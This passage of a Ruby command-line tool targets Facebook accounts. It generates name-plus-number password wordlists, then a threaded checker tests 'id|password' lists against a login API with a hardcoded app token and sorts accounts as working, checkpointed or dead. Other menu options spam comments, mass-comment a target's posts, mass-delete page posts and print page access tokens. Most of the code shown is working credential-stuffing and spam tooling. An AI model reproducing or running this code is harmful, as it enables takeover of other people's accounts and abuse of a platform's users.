    password = "%s%s\n%s%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s\n%s%s" % [a, c, a, b, b, a, b, c, c, a, c, b, a, a, b, b, c, c, a, d, b, d, c, d, d, d, d, a, d, b, d, c, a, e, a, f, a, g, a, h, b, e, b, f, b, g, b, h, c, e, c, f, c, g, c, h, d, e, d, f, d, g, d, h, e, a, f, a, g, a, h, a, e, b, f, b, g, b, h, b, e, c, f, c, g, c, h, c, e, d, f, d, g, d, h, d, d, d, a, f, g, a, g, h, f, g, f, h, f, f, g, f, g, h, g, g, h, f, h, g, h, h, h, g, f, a, g, h, b, f, g, b, g, h, c, f, g, c, g, h, d, f, g, d, g, h, a, i, a, j, a, k, i, e, i, j, i, k, b, i, b, j, b, k, c, i, c, j, c, k, e, k, j, a, j, b, j, c, j, d, j, j, k, a, k, b, k, c, k, d, k, k, i, l, i, m, i, n, j, l, j, m, j, n, j, k]
    puts ("\033[97m[+] Creating Files...")
    save = a + '.txt'
    File.open(save,'w') do |data|
      tik("\033[97m[+] Pleace Wait....")
      data << password
      100.times{|x_x| data << a + x_x.to_s + "\n"}
      100.times{|x_x| data << i + x_x.to_s + "\n"}
      100.times{|x_x| data << d + x_x.to_s + "\n"}
      100.times{|x_x| data << j + x_x.to_s + "\n"}
    end
    puts ("\033[97m[\033[92m✓\033[97m] \033[92mSuccess "+save)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    lain()
  rescue Exception
    abort ("\033[91m[!] Failed to Create File")
  end
end

def AksesToken()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m[+] Your Access Token : "+$token)
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  lain()
end

def AccountCheck()
  $ok = 0
  $cp = 0
  $die = 0
  system('clear')
  puts ($logo)
  puts ("\033[92m[ INFO ] SEPERATOR id | password\033[97m")
  puts ("\033[97m═"*52)
  print ("\033[97m[+] File : ")
  file = gets.chomp()
  if File.file? (file)
    files = File.readlines(file, chomp: true)
    puts ("\033[97m[+] Total %s Account" % [files.length])
    puts ("\033[97m[+] START..")
    puts ("\033[97m═"*52)
    pool = Thread.pool($MaxProcess)
    files.each {|i| pool.process{Check(i)}}
    pool.shutdown
    puts ("\033[97m═"*52)
    puts ("\033[92mTotal OK : "+$ok.to_s)
    puts ("\033[93mTotal CP : "+$cp.to_s)
    puts ("\033[91mTotal Die: "+$die.to_s)
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    lain()
  else
    puts ("\033[83m[+] File Not Found")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    lain()
  end
end

def Check(data)
  begin
    sep = data.split('|')
    id = sep[0]
    pwd = sep[1]
    x = get('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + id + '&locale=en_US&password=' + pwd + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
    f = JSON.parse(x)
    if f.include? ('access_token')
      puts ("\033[92m[Success] %s  | %s" % [id,pwd])
      $ok += 1
    elsif f.include? ('error_msg') and f['error_msg'].include?  ('www.facebook.com')
      puts ("\033[93m[Check] %s  | %s" % [id,pwd])
      $cp += 1
    else
      puts ("\033[91m[Failed] %s  | %s" % [id,pwd])
      $die += 1
    end
  rescue SocketError
    puts ("\033[91m[!] No Connection")
  rescue => err
    puts ("\033[93m[!] "+err)
  end
end

def Mygroup()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  tik("\033[97m[+] Please Wait....")
  puts ("\033[97m═"*52)
  a = get("https://graph.facebook.com/me/groups?limit=#{$limits}&access_token=#{$token}")
  b = JSON.parse(a)
  if not b.key? ("data")
    puts (b)
    abort ("\033[91m[!] Error")
  elsif b['data'].empty?
    puts ("\033[93m[+] There are no groups in your account")
  else
    c = b['data'].each{|i|
      puts ("\033[92m[✓] Group Name : #{i['name']}")
      puts ("\033[92m[✓] Group Id   : #{i['id']}")
      puts ("\033[97m═"*52)
      }
    puts ("\033[92m[✓] Total Groups #{c.length}")
  end
end

def GuardMenu()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("║-> \x1b[1;37;40m1. Enable")
  puts ("║-> \x1b[1;37;40m2. Disable")
  puts ("║-> \x1b[1;37;40m0. Back")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    Guard()
  elsif mana == '2' or mana == '02'
    Guard(on = false)
  else
    lain()
  end
end


def Guard(on = true)
  begin
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    data = 'variables={"0":{"is_shielded": %s,"session_id":"9b78191c-84fd-4ab6-b0aa-19b39f04a6bc","actor_id":"%s","client_mutation_id":"b0316dd6-3fd6-4beb-aed4-bb29c5dc64b0"}}&method=post&doc_id=1477043292367183&query_name=IsShieldedSetMutation&strip_defaults=true&strip_nulls=true&locale=en_US&client_country_code=US&fb_api_req_friendly_name=IsShieldedSetMutation&fb_api_caller_class=IsShieldedSetMutation' % [on, $id]
    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth '+$token}
    url = 'https://graph.facebook.com/graphql'
    res = Requests.post(url, data: data, headers: headers).body
    puts (res)
    if res.include? ('"is_shielded":true')
      puts ("\033[92m[✓] Activated")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      lain()
    else
      puts ("\033[93m[!] Deactivated")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      lain()
    end
  rescue Requests::Error
    abort ("\033[91m[!] Error")
  end
end

def Fanpage()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m║-> \x1b[1;37;40m1. Publish a Post")
  puts ("\033[97m║-> \x1b[1;37;40m2. Publish a Link")
  puts ("\033[97m║-> \x1b[1;37;40m3. Comment Post")
  puts ("\033[97m║-> \x1b[1;37;40m4. Spam Comments")
  puts ("\033[97m║-> \x1b[1;37;40m5. Delete Post")
  puts ("\033[97m║-> \x1b[1;37;40m6. Access Token")
  puts ("\033[97m║-> \x1b[1;32;40m0. Back")
  puts ("\x1b[1;37;40m║")
  print ("╚═\x1b[1;91m▶\x1b[1;97m ")
  mana = gets.chomp()
  if mana == '1' or mana == '01'
    PagePost()
  elsif mana == '2' or mana == '02'
    PagePostLink()
  elsif mana == '3' or mana == '03'
    PageComment()
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Fanpage()
  elsif mana == '4' or mana == '04'
    PageSpamComment()
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Fanpage()
  elsif mana == '5' or mana == '05'
    PageDeletePost()
  elsif mana == '6' or mana == '06'
    PageToken()
  elsif mana == '0' or mana == '00'
    lain()
  else
    puts ("\033[93m[!] Invalid Input")
    sleep(0.9)
    Fanpage()
  end
end

def PageToken()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  puts ("\033[97m[+] Loading")
  a = get("https://graph.facebook.com/"+ $id + "/accounts?fields=name,access_token&access_token="+$token)
  b = JSON.parse(a)
  total = b['data'].each{|i| i['id']}
  puts ("\033[97m[+] Total Page : "+total.length.to_s)
  puts ("\033[97m═"*52)
  if b['data'] == []
    puts ("\033[93m[!] Your Account Does Not Have a Fan Page")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Fanpage()
  else
    for x in b['data']
      puts ("\033[97m[+] Page Name : "+x['name'])
      puts ("\033[97m[+] Page Id : "+x['id'])
      puts ("\033[97m[+] Access Token : #{x['access_token']}")
      puts ("\n")
      #puts ("\033[97m═"*52)
    end
    print ("\033[91m[\033[92mBack\033[91m] ")
    gets
    Fanpage()
  end
end

def PagePost()
  system('clear')
  puts ($logo)
  puts ("\033[97m[!] Use <> For New Line")
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Your Page Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  print ("\033[97m[+] Message : ")
  msg = gets.chomp()
  msg = msg.tr("<>","\n")
  puts ("\033[97m[+] Loading.....")
  puts ("\033[97m═"*52)
  a = get("https://graph.facebook.com/"+ $id + "/accounts?fields=name,access_token&access_token="+$token)
  b = JSON.parse(a)
  token = b['data'].map {|i| i['access_token'] if i['id'] == id}
  url = URI("https://graph.facebook.com/#{id}/feed")
  data = {"message"=>msg,"access_token"=>token}
  req = Net::HTTP.post_form(url,data)
  res = JSON.parse(req.body)
  puts ("\033[92m[✓] Success : #{res['id']}") if res.include? ('id')
  puts ("\033[91m[!] Failed : nil") if not res.include? ('id')
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  Fanpage()
end

def PagePostLink()
  system('clear')
  puts ($logo)
  puts ("\033[97m[!] Use <> For New Line")
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Your Page Id : ")
  id = gets.chomp() ; id = id.tr(" ","")
  print ("\033[97m[+] LINK : ")
  url = gets.chomp()
  url = "https://#{url}" if not url.match? ('https://')
  print ("\033[97m[+] Message : ")
  msg = gets.chomp()
  msg = msg.tr("<>","\n")
  a = get("https://graph.facebook.com/"+ $id + "/accounts?fields=access_token&access_token="+$token)
  b = JSON.parse(a)
  token = b['data'].map {|i| i['access_token'] if i['id'] == id}
  data = {"message"=>msg,"link"=>url,"access_token"=>token}
  uri = URI("https://graph.facebook.com/#{id}/feed")
  req = Net::HTTP.post_form(uri,data)
  res = JSON.parse(req.body)
  puts ("\033[92m[✓] Success : #{res['id']}") if res.include? ('id')
  puts ("\033[91m[!] Failed  : nil") if not res.include? ('id')
  print ("\n\033[91m[\033[92mBack\033[91m] ")
  gets
  Fanpage()
end

def PageComment()
  system('clear')
  puts ($logo)
  puts ("\033[97m[!] Target Must Be Page")
  puts ("\033[97m[!] Use <> For New Line")
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Your Page Id : ")
  id = gets.chomp()
  print ("\033[97m[+] Target Id  : ")
  target = gets.chomp()
  print ("\033[97m[+] Comment : ")
  body = gets.chomp()
  body = body.tr("<>","\n")
  a = get("https://graph.facebook.com/"+ $id + "/accounts?fields=access_token&access_token="+$token)
  b = JSON.parse(a)
  token = b['data'].map {|i| i['access_token'] if i['id'] == id}
  if token[0].to_s.match? ('EAA')
    puts ("\033[93m[!] Please wait!...")
    c = get("https://graph.facebook.com/v1.0/#{target}?fields=feed.limit=#{$limits}&access_token=#{token[0]}")
    d = JSON.parse(c)
    #puts (d)
    if d.key? ('error')
      puts ("\033[93m[+] Target Not Found")
    elsif d['feed']['data'].empty?
      puts ("\033[97m[+] No Posts")
    else
      puts ("\033[93m[+] CTRL + C TO STOP")
      puts ("\033[97m═"*52)
      for i in d['feed']['data']
        begin
          data = {"message"=>body,"access_token"=>token[0]}
          url = URI("https://graph.facebook.com/#{i['id']}/comments")
          req = Net::HTTP.post_form(url,data).body
          res = JSON.parse(req)
          puts ("\033[92m[✓] Success --> #{i['id']}") if res.key? ('id')
          puts ("\033[93m[!] Failed  --> #{i['id']}") if not res.key? ('id')
          sleep(0.2)
        rescue SocketError
          puts ("\033[91m[!] No Connection")
          sleep(0.9)
        rescue Interrupt
          puts ("\n")
          break
        end
      end
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Finish")
    end
  else
    puts ("\033[93m[+] Your Account Does Not Have A Page With Id #{id}")
  end
end

def PageSpamComment()
  system('clear')
  puts ($logo)
  puts ("\033[97m[!] Use <> For New Line")
  puts ("\033[97m═"*52)
  print ("\033[97m[+] Your Page Id : ")
  id = gets.chomp()
  print ("\033[97m[+] Page Post Id : ")
  posts = gets.chomp()
  print ("\033[97m[+] Comment : ")
  body = gets.chomp()
  body = body.tr("<>","\n")
  a = get("https://graph.facebook.com/"+ $id + "/accounts?fields=access_token&access_token="+$token)
  b = JSON.parse(a)
  token = b['data'].map {|i| i['access_token'] if i['id'] == id}
  if token[0].to_s.match? ('EAA')
    c = get("https://graph.facebook.com/#{posts}?fields=from&access_token=#{token[0]}")
    d = JSON.parse(c)
    if d.key? ('from')
      puts ("\033[97m[+] Posted By #{d['from']['name']}")
      puts ("\033[93m[!] CTRL + C TO STOP")
      puts ("\033[97m═"*52)
      url = URI("https://graph.facebook.com/#{posts}/comments")
      data = {"message"=>body,"access_token"=>token}
      $limits.times do |i|
        begin
          req = Net::HTTP.post_form(url,data).body
          puts ("\033[92m[✓] Success -> #{posts}") if req.include? ('id')
          puts ("\033[93m[!] Failed  -> #{posts}") if not req.include? ('id')
        rescue SocketError
          puts ("\033[91m[!] Not Connection")
          sleep(0.2)
        rescue Interrupt
          puts ("\n") ; break
        end
      end
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Finish")
    else
     puts ("\033[93m[+] Posts Not Found")
    end
  else
    puts ("\033[93m[+] Your Account Does Not Have A Page With Id #{id}")
  end
end

def PageDeletePost()
  begin
    total = 0
    system('clear')
    puts ($logo)
    puts ("\033[97m═"*52)
    print ("\033[97m[+] Your Page Id : ")
    id = gets.chomp() ; id = id.tr(" ","")
    a = get("https://graph.facebook.com/"+ $id + "/accounts?fields=name,access_token&access_token="+$token)
    b = JSON.parse(a)
    #puts (b)
    token = b['data'].map {|i| i['access_token'] if i['id'] == id}
    if token[0].to_s.match? ('EAA')
      puts ("\033[97m[+] Page Name : #{b['data'][0]['name']}")
      puts ("\033[97m[+] CTRL + C TO STOP")
      puts ("\033[97m[+] Loading....")
      a = get("https://graph.facebook.com/#{id}?fields=feed.limit(#{$limits})&access_token=#{token[0]}")
      b = JSON.parse(a)
      puts ("\033[97m═"*52)
      remove = b['feed']['data'].map {|i| i['id']}
      for x in remove
        begin
          Requests.delete("https://graph.facebook.com/#{x}?access_token=#{token[0]}")
          puts ("\033[92m[✓] Success : #{x}")
          total += 1
        rescue
          puts ("\033[91m[!] Failed : #{x}")
        rescue Interrupt
          puts ("\n") ; break
        end
      end
      puts ("\033[97m═"*52)
      puts ("\033[92m[✓] Finish "+ total.to_s)
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Fanpage()
    else
      puts ("\033[93m[+] Your Account Does Not Have A Page With Id #{id}")
      print ("\n\033[91m[\033[92mBack\033[91m] ")
      gets
      Fanpage()
    end
  rescue NoMethodError
    puts ("\033[93m[!] No Post")
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    Fanpage()
  end
end

 
def update()
  system('clear')
  puts ($logo)
  puts ("\033[97m═"*52)
  a = system('git pull')
  if a.nil?
    abort ("\033[93m[!] Git Not Installed\n\033[91m[!] Exit\n")
  elsif a == false
    abort ("\033[93m[!] There is an error")
  else
    print ("\n\033[91m[\033[92mBack\033[91m] ")
    gets
    menu()
  end
end
  

if OS.linux?
  masuk()
else
  abort ("#{$0} : The Program Is Not Supported On Your Operating System")
end